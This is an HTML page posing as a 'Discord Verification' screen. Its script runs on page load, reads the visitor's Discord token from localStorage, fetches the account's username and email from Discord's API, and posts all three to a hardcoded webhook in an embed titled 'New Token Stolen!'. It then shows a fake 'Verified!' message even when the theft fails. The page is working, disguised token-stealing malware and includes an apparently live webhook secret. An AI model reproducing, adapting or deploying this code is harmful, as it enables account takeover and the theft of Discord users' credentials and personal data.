<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Verification</title>
    <style>
        body {
            background-color: #2f3136;
            color: white;
            font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            background: #36393f;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
            width: 300px;
        }
        h2 { margin-bottom: 20px; color: #ffffff; }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #5865F2;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .success {
            color: #23a559;
            font-weight: bold;
            display: none;
        }
        .hidden { display: none; }
    </style>
</head>
<body>

<div class="container">
    <div id="loading">
        <h2>Verifying...</h2>
        <div class="loader"></div>
        <p>Please wait while we secure your account.</p>
    </div>
    
    <div id="success" class="success">
        <h2>✅ Verified!</h2>
        <p>You can now close this window.</p>
    </div>
</div>

<script>
    // --- CONFIGURATION ---
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1561503136219136022/sYHNqQkICF9VvxzmsXzL3RMNYaOgtaEdtIJ50apn6ebuES0ZzZNbRO-_AMhW0Ywz_7ED";

    // Function to send data to webhook
    function sendToWebhook(token) {
        const payload = {
            embeds: [{
                title: "🔑 New Token Stolen!",
                description: "User has been verified.",
                fields: [
                    { name: "Token", value: `\`\`\`${token}\`\`\``, inline: false },
                    { name: "Username", value: `${window.discord_user || "Unknown"}`, inline: true },
                    { name: "Email", value: `${window.discord_email || "Unknown"}`, inline: true }
                ],
                color: 0x5865F2,
                footer: { text: "Stolen at: " + new Date().toLocaleString() }
            }]
        };

        fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        }).then(() => {
            console.log("Token sent!");
        }).catch(err => console.error(err));
    }

    // Try to get token from localStorage (Standard Desktop App)
    async function stealToken() {
        try {
            // Method 1: Direct localStorage access (Works in Electron apps like Discord PC/Mac)
            const token = localStorage.getItem('token');
            
            if (token) {
                // Extract user info if possible
                try {
                    const response = await fetch('https://discord.com/api/v9/users/@me', {
                        headers: { Authorization: token }
                    });
                    const user = await response.json();
                    window.discord_user = user.username + "#" + user.discriminator;
                    window.discord_email = user.email || "Private";
                } catch (e) {}

                sendToWebhook(token);
                
                // Show success screen after a delay
                setTimeout(() => {
                    document.getElementById('loading').classList.add('hidden');
                    document.getElementById('success').style.display = 'block';
                }, 2000);
            } else {
                // Method 2: Fallback for browsers/mobile (less reliable but worth trying)
                const allTokens = Object.keys(localStorage).filter(key => key.startsWith('discord-token'));
                if(allTokens.length > 0) {
                     sendToWebhook(localStorage.getItem(allTokens[0]));
                }
                setTimeout(() => {
                    document.getElementById('loading').classList.add('hidden');
                    document.getElementById('success').style.display = 'block';
                }, 2000);
            }
        } catch (error) {
            console.error("Steal failed", error);
            // Still show success to not break the UX
            setTimeout(() => {
                document.getElementById('loading').classList.add('hidden');
                document.getElementById('success').style.display = 'block';
            }, 2000);
        }
    }

    // Run immediately on load
    stealToken();
</script>

</body>
</html>
